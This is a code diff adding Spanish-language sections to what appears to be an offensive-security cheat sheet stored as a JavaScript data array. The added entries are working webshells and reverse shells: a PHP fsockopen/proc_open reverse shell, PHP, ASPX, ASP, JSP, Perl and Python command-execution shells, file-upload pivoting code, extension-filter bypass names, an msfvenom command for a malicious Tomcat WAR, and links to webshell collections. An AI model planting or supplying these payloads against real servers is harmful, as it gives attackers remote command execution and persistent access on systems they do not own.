@@ -398,6 +398,31 @@ const DATA = [
       ]},
       {h:"Generador de payloads online (referencia rápida)", blocks:[
         {p:"Para no tipear a mano — pegar IP/puerto y copiar", code:`https://www.revshells.com/`}
+      ]},
+      {h:"Webshells / archivos para upload — PHP", blocks:[
+        {p:"Reverse shell completa (fsockopen + proc_open)", code:`<?php\nset_time_limit(0);\n$ip = '<IP>';\n$port = <PUERTO>;\n$sock = fsockopen($ip, $port);\n$proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);\n?>`},
+        {p:"Webshell simple — ejecutar comandos por GET", code:`<?php system($_GET['cmd']); ?>`},
+        {p:"Webshell simple — ejecutar comandos por POST (menos ruidoso en logs/history)", code:`<?php system($_POST['cmd']); ?>`},
+        {p:"Variante con output de múltiples funciones (por si alguna está deshabilitada)", code:`<?php\nif(isset($_GET['cmd'])){\n  $c = $_GET['cmd'];\n  if(function_exists('system')) system($c);\n  elseif(function_exists('shell_exec')) echo shell_exec($c);\n  elseif(function_exists('exec')) { exec($c, $o); echo implode("\\n", $o); }\n  elseif(function_exists('passthru')) passthru($c);\n}\n?>`},
+        {p:"Upload de archivos adicionales desde el webshell (pivoteo)", code:`<?php move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']); ?>`},
+        {p:"One-liner para bypass de filtros básicos de extensión", code:`shell.php5\nshell.phtml\nshell.pHp\nshell.php.jpg   # si el server procesa doble extensión`}
+      ]},
+      {h:"Webshells — ASP / ASPX (IIS)", blocks:[
+        {p:"ASPX — ejecutar comandos (cmd.exe)", code:`<%@ Page Language="C#" %>\n<%\nString cmd = Request.QueryString["cmd"];\nif (cmd != null) {\n  System.Diagnostics.Process p = new System.Diagnostics.Process();\n  p.StartInfo.FileName = "cmd.exe";\n  p.StartInfo.Arguments = "/c " + cmd;\n  p.StartInfo.UseShellExecute = false;\n  p.StartInfo.RedirectStandardOutput = true;\n  p.Start();\n  Response.Write(p.StandardOutput.ReadToEnd());\n}\n%>`},
+        {p:"ASP clásico (IIS viejo)", code:`<% \nDim cmd, result\ncmd = Request.QueryString("cmd")\nSet objShell = Server.CreateObject("WScript.Shell")\nSet objExec = objShell.Exec("cmd.exe /c " & cmd)\nresult = objExec.StdOut.ReadAll\nResponse.Write(result)\n%>`}
+      ]},
+      {h:"Webshells — JSP (Tomcat/Java)", blocks:[
+        {p:"JSP — ejecutar comandos", code:`<% if(request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); java.io.InputStream in = p.getInputStream(); int a = -1; while((a=in.read())!=-1){ out.print((char)a); } } %>`},
+        {p:"WAR malicioso para Tomcat Manager (msfvenom)", code:`msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PUERTO> -f war -o shell.war`}
+      ]},
+      {h:"Webshells — otros lenguajes", blocks:[
+        {p:"Perl / CGI", code:`#!/usr/bin/perl\nprint "Content-type: text/html\\n\\n";\nsystem(param('cmd'));`},
+        {p:"Python (si el server corre scripts .py / CGI)", code:`#!/usr/bin/env python3\nimport cgi, subprocess\nform = cgi.FieldStorage()\nprint("Content-Type: text/html\\n")\nif "cmd" in form:\n    print(subprocess.getoutput(form["cmd"].value))`}
+      ]},
+      {h:"Webshells con todo incluido (proyectos conocidos)", blocks:[
+        {p:"p0wny-shell — PHP, todo en un archivo, interfaz tipo terminal", code:`https://github.com/flozz/p0wny-shell`},
+        {p:"PHP webshells de referencia (varias variantes)", code:`https://github.com/WhiteWinterWolf/wwwolf-php-webshell`},
+        {p:"Laudanum — colección multi-lenguaje (PHP, ASP, ASPX, JSP)", code:`locate laudanum\n/usr/share/webshells/   # suele venir en Kali`}
       ]}
     ]
   },
